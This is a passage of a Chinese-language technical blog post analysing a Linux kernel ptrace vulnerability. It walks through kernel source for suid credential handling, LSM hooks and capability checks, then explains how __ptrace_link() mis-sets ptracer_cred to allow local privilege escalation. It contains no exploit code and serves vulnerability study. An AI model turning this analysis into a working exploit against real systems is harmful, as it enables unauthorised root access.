class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;euid = uid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们注意到这样一个逻辑：当我们尝试运行一个 suid 程序时，其会将新进程的 cred-&gt;euid 设置为 suid 文件的 uid</p><p>那么如果我们 fork 出子进程运行 suid 程序、父进程再 ptrace attach 岂不就能直接完成提权了吗？答案是否定的，因为后面还会进行权限检查，我们继续跟踪调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br><span class="line">    security_bprm_set_creds()</span><br></pre></td></tr></table></figure><p>该函数定义于 <code>security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">security_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> call_int_hook(bprm_set_creds, <span class="number">0</span>, bprm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然只有一个语句但解释起来可能有点复杂，这里我们要引入一个新的概念—— <code>Linux Security Modules</code>（LSM）</p><h3 id="Linux-Security-Modules"><a href="#Linux-Security-Modules" class="headerlink" title="Linux Security Modules"></a>Linux Security Modules</h3><p>LSM 即 Linux 安全模组，类似于 VFS， 其提供了统一的安全业务逻辑接口，例如 SELinux 便是基于 LSM 实现的，整体框架如下：</p><p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" alt="偷的图.png"></p><blockquote><p>启用这个框架需要开启内核编译选项 <code>CONFIG_SECURITY</code>（默认开启）</p></blockquote><p>现在我们来剖析 <code>call_int_hook</code> 宏，该宏用于<strong>调用对应的 LSM 钩子</strong>，定义于 <code>/security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span></span><br><span class="line"><span class="meta">int RC = IRC;\</span></span><br><span class="line"><span class="meta">do &#123;\</span></span><br><span class="line"><span class="meta">struct security_hook_list *P;\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span></span><br><span class="line"><span class="meta">RC = P-&gt;hook.FUNC(__VA_ARGS__);\</span></span><br><span class="line"><span class="meta"><span class="keyword">if</span> (RC != 0)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">&#125; while (0);\</span></span><br><span class="line"><span class="meta">RC;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>其中 <code>list_for_each_entry</code> 是内核中常用遍历宏，这里不再赘叙，这里的 <code>security_hook_heads</code> 是一个<strong>全局结构体</strong>，阅读源码可以发现其中存放的都是内核双向链表结构，其实对应的应当是 <code>security_hook_list</code> 结构体，定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Security module hook list structure.</span></span><br><span class="line"><span class="comment"> * For use with generic list macros for common operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>*<span class="title">head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">security_list_options</span><span class="title">hook</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中联合体 <code>security_list_options</code> 其实就是一个函数指针，不再赘叙，那么 <code>call_int_hook</code> 宏的作用就不言而喻了：调用 <code>security_hook_heads</code> 中对应成员的函数指针。我们也可以看出 <code>security_hook_heads</code> 结构体相当于一张函数表</p><p>这张函数表会在内核初始化时被初始化，这里我们将目光放到<strong>内核启动的初始化函数</strong>——<code>start_kernel()</code> 中，该函数定义于 <code>/init/main.c</code> 中，我们观察到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> __init <span class="title function_">start_kernel</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    security_init();</span><br></pre></td></tr></table></figure><p>函数 <code>security_init()</code> 用以进行 LSM 的初始化，定义于 <code>/security/security.c</code> 中，观察到如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security_init()</span><br><span class="line">    capability_add_hooks()</span><br></pre></td></tr></table></figure><p>这里 <code>capability_add_hooks()</code> 逻辑比较简单，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] =</span> &#123;</span><br><span class="line">LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),</span><br><span class="line">LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">capability_add_hooks</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></figure><p>这里 <code>security_add_hooks()</code> 函数定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">security_add_hooks</span><span class="params">(<span class="keyword">struct</span> security_hook_list *hooks,</span></span><br><span class="line"><span class="params">      <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">list_add_tail_rcu(&amp;hooks[i].<span class="built_in">list</span>, hooks[i].head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里整个逻辑就一目了然了，该函数表会根据表 <code>capability_hooks</code> 进行对应的初始化操作</p><h3 id="ptracer-权限检查"><a href="#ptracer-权限检查" class="headerlink" title="ptracer 权限检查"></a>ptracer 权限检查</h3><p>现在让我们将目光放回 <code>security_bprm_set_creds()</code>函数，我们现在可以知道其调用的应当是 <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>，这个钩子指向函数 <code>cap_bprm_set_creds</code>，该函数定义于<code>/security/commoncap.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cap_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> current_cred();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> bprm-&gt;cred;</span><br><span class="line"><span class="type">bool</span> effective, has_cap = <span class="literal">false</span>, is_setid;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"><span class="type">kuid_t</span> root_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 笔者注：对被 ptrace 的 suid/sgid 进程进行权限检查</span></span><br><span class="line">    <span class="comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment"> * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((is_setid || <span class="comment">// 是否为 suid/sgid</span></span><br><span class="line">     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;</span><br><span class="line">    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||</span><br><span class="line">     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="comment">// 是否被 ptrace，若是，检查是否越权</span></span><br><span class="line"><span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">        <span class="comment">//若检查出越权，则重新进行一次检查，进行降权</span></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">new-&gt;euid = new-&gt;uid;</span><br><span class="line">new-&gt;egid = new-&gt;gid;</span><br><span class="line">&#125;</span><br><span class="line">new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,</span><br><span class="line">   old-&gt;cap_permitted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new-&gt;suid = new-&gt;fsuid = new-&gt;euid;</span><br><span class="line">new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>其中 <code>ptracer_capable()</code> 定义于 <code>/kernel/capability.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span></span><br><span class="line"><span class="comment"> * @tsk: The task that may be ptraced</span></span><br><span class="line"><span class="comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span></span><br><span class="line"><span class="comment"> * in the specified user namespace.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ptracer_capable</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> user_namespace *ns)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line"><span class="keyword">if</span> (cred)</span><br><span class="line">ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数检查了进程的 <code>ptracer_cred</code> 字段，若不为 NULL 则说明该进程为 ptracee，接下来使用 <code>security_capable_noaudit</code> 函数进行检查，该函数也是一个 LSM 钩子的 API，对应调用 <code>security_hook_heads-&gt;capable-&gt;hook</code>，对应函数为 <code>cap_capable()</code>，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cap_capable - Determine whether a task has a particular effective capability</span></span><br><span class="line"><span class="comment"> * @cred: The credentials to use</span></span><br><span class="line"><span class="comment"> * @ns:  The user namespace in which we need the capability</span></span><br><span class="line"><span class="comment"> * @cap: The capability to check for</span></span><br><span class="line"><span class="comment"> * @audit: Whether to write an audit message or not</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Determine whether the nominated task has the specified capability amongst</span></span><br><span class="line"><span class="comment"> * its effective set, returning 0 if it does, -ve if it does not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span></span><br><span class="line"><span class="comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span></span><br><span class="line"><span class="comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span></span><br><span class="line"><span class="comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cap_capable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *cred, <span class="keyword">struct</span> user_namespace *targ_ns,</span></span><br><span class="line"><span class="params"><span class="type">int</span> cap, <span class="type">int</span> audit)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> targ_ns;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* See if cred has the capability in the target user namespace</span></span><br><span class="line"><span class="comment"> * by examining the target user namespace and all of the target</span></span><br><span class="line"><span class="comment"> * user namespace&#x27;s parents.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/* Do we have the necessary capabilities? */</span></span><br><span class="line">        <span class="comment">// 若与 ptracer 同属同一命名空间，检查权限是否足够</span></span><br><span class="line"><span class="keyword">if</span> (ns == cred-&gt;user_ns)</span><br><span class="line"><span class="keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="number">0</span> : -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Have we tried all of the parent namespaces? */</span></span><br><span class="line">        <span class="comment">// 自底向上遍历完了，说明检查出错，返回对应错误值</span></span><br><span class="line"><span class="keyword">if</span> (ns == &amp;init_user_ns)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * The owner of the user namespace in the parent of the</span></span><br><span class="line"><span class="comment"> * user namespace has all caps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 我们主要关注这里，这里会检查 ptracer_cred 的命名空间是否是新进程命名空间的父命名空间</span></span><br><span class="line">        <span class="comment">// 若是，检查是否新进程命名空间的所有者是否与 ptracer 为同一用户</span></span><br><span class="line">        <span class="comment">// 若是，返回 0，说明通过检查</span></span><br><span class="line">        <span class="comment">// 若否，向上遍历命名空间，回到开头</span></span><br><span class="line"><span class="keyword">if</span> ((ns-&gt;parent == cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If you have a capability in a parent user ns, then you have</span></span><br><span class="line"><span class="comment"> * it over all children user namespaces as well.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ns = ns-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We never get here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会检查 ptracee 的命名空间所有者是否与 ptracer 为同一用户，<strong>只有这两者同属同一用户，检查才能通过，否则检查将不会通过，从而导致降权</strong></p><p>接下来的判断语句中调用的 <code>ns_capable()</code> 函数最终也会走到这个路径，这里便不再赘叙，感兴趣的可以自行检索阅读如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ns_capable()</span><br><span class="line">ns_capable_common()</span><br><span class="line">        security_capable()</span><br><span class="line">            cap_capable()</span><br></pre></td></tr></table></figure><p>由此我们得到结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p><h2 id="LSM-与-ptracer-权限检查"><a href="#LSM-与-ptracer-权限检查" class="headerlink" title="LSM 与 ptracer 权限检查"></a>LSM 与 ptracer 权限检查</h2><p>前面我们讲了对 ptracee 执行新程序的权限检查，现在我们来看对于 ptracer 操作的检查</p><p>将目光放回 ptrace 系统调用的源码中，对于 ptracer 的 <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> 这几个操作，会走入如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    arch_ptrace()</span><br><span class="line">    ptrace_request()</span><br><span class="line">    generic_ptrace_peekdata() / generic_ptrace_pokedata()</span><br><span class="line">    ptrace_access_vm()</span><br><span class="line">    ptracer_capable()</span><br><span class="line">    security_capable_noaudit()</span><br></pre></td></tr></table></figure><p>这里就又走回我们上面的路径了，不再重复分析，这里简单说明一点就是在 <code>ptrace_request()</code> 中传给下层被调函数的 task 参数为 ptracee 的 task_struct，在 <code>ptrace_access_vm()</code> 中传入的命名空间也为 ptracee 的 mm 的命名空间，因此<strong>最后权限判断还是根据 ptracee 进程的</strong> <code>ptracer_cred</code> <strong>字段</strong></p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>细心的读者或许已经观察到了，前面我们的预备知识中缺少了<strong>设置 ptracee 的 ptracer_cred 字段</strong>这一过程，实际上<strong>我们的漏洞便是出现在这个位置</strong></p><p>我们将目光重新放回 ptrace 系统调用的源码当中，当 ptracee 进程调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> 时，会走到如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    ptrace_traceme()</span><br><span class="line">    __ptrace_link()</span><br></pre></td></tr></table></figure><p>其中 <code>__ptrace_link()</code> 函数<strong>就是本次出现漏洞的函数</strong>，该函数用于建立 ptrace link，定义于 <code>/kernel/ptrace.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace a task: make the debugger its new parent and</span></span><br><span class="line"><span class="comment"> * move it to the ptrace list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Must be called with the tasklist lock write-held.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __ptrace_link(<span class="keyword">struct</span> task_struct *child, <span class="keyword">struct</span> task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);</span><br><span class="line">child-&gt;parent = new_parent;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的功能比较简单，主要就是在 rcu 机制下将子进程的 <code>ptracer_cred</code> 字段设为<strong>父进程的 cred</strong>，这里的 <code>__task_cred()</code> 宏的作用主要是 rcu 机制下取得进程 real_cred，而 <code>get_cred()</code> 函数主要是将 cred 的引用计数 + 1</p><blockquote><p>RCU 机制即 ready-copy update ，该机制确保了多线程下读与写的同步，这里不详细介绍，原理可以简单理解为“节点更新”——读无限制，要写时先新建节点写入新节点，随后将节点更新到指针，这个过程中读者读的都是旧节点，随后等待读者退出，释放旧节点，新节点投入使用</p></blockquote><p>按照  Jann Horn 的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> 阐述，在这里存在着<strong>两个问题</strong>：</p><ul><li>竞态条件下导致错误的引用计数</li><li>ptracer_cred 设置的逻辑错误导致本地提权</li></ul><p>下面我们来逐一分析</p><h2 id="竞态条件下导致错误的引用计数"><a href="#竞态条件下导致错误的引用计数" class="headerlink" title="竞态条件下导致错误的引用计数"></a>竞态条件下导致错误的引用计数</h2><p>在 <code>__ptrace_link()</code> 函数中调用了 <code>get_cred()</code> 函数获取父进程的 cred，该函数会将其引用计数 + 1，这看起来<strong>好像没有什么问题</strong>，不是么？我们引用了父进程的 cred，自然引用计数要 + 1，当 ptrace 流程结束后，引用计数再 - 1，这一切看起来似乎很正常</p><p>咋一看这个流程设计似乎是没有问题的，但在竞态条件下就不一定了，我们现在将目光放到一个对于 kernel pwner 而言或许都很熟悉但不一定曾深入研究过的一个函数——<code>commit_creds</code>，该函数定义于 <code>kernel/cred.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数末尾会两次调用 <code>put_cred()</code> 函数，该函数定义于 <code>/include/linux/cred.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span 